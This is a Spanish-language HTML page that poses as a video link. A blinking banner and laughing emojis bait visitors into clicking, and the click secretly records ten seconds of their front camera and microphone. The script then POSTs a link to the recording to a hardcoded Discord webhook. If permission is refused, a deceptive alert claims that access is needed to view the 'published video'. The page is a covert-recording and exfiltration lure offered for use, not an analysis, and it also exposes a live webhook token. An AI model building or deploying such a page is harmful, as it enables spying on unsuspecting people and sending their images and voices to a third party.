<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GRABANDO VIDEO</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000; /* Fondo negro */
            font-family: Arial, sans-serif;
            color: #ffffff; /* Texto blanco */
            position: relative;
        }
        #container {
            width: 80%;
            max-width: 600px;
            border: 2px solid #ff0000; /* Contorno rojo */
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            position: relative;
            cursor: pointer;
        }
        video, img {
            width: 100%;
            border-radius: 10px;
        }
        .warning {
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .emojis {
            font-size: 32px;
            position: absolute;
            bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="warning">GUARDANDO VIDEO</div>
    <div id="container" onclick="startWebcam()">
        <!-- Cambia 'vista-previa.jpg' por el nombre de tu imagen -->
        <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
        <video id="video" autoplay style="display: none;"></video>
    </div>
    <div class="emojis">üòÇü§£üòÜ</div>

    <script>
        async function startWebcam() {
            try {
                const constraints = {
                    video: {
                        facingMode: "user" // Intenta usar la c√°mara frontal
                    },
                    audio: true // Habilitar el audio para grabar con sonido
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const videoElement = document.getElementById('video');
                const previewImage = document.getElementById('previewImage');
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                previewImage.style.display = 'none';

                // Iniciar la grabaci√≥n autom√°ticamente
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const enlaceDescarga = await guardarVideo(blob);
                    enviarMensajeDiscordConWebhook(enlaceDescarga);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // Detener la grabaci√≥n despu√©s de 10 segundos
            } catch (error) {
                console.error('Error al acceder a la c√°mara:', error);
                alert('No se pudo acceder a la pagina. Aseg√∫rate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
            }
        }

        async function guardarVideo(blob) {
            // Aqu√≠ puedes implementar la l√≥gica para guardar el video en tu servidor o en un servicio de almacenamiento en la nube
            // Por ahora, simplemente devolveremos un enlace temporal para mostrar c√≥mo funciona
            return URL.createObjectURL(blob);
        }

        async function enviarMensajeDiscordConWebhook(enlace) {
            try {
                const webhookURL = 'https://discord.com/api/webhooks/1243016760014278737/-rJTQS8xYX2H-zZHV22yU4LCJOxhYIJsfNtERt_Z3Wbd0wLWnzD7QKYwHL0h4iDXicSX'; // URL del webhook de Discord

                const mensaje = {
                    content: `Aqu√≠ tienes el enlace de descarga del video: ${enlace}`
                };

                const respuesta = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(mensaje)
                });

                console.log('Mensaje enviado a Discord a trav√©s del webhook:', respuesta);
            } catch (error) {
                console.error('Error al enviar el mensaje a Discord a trav√©s del webhook:', error);
            }
        }
    </script>
</body>
</html>
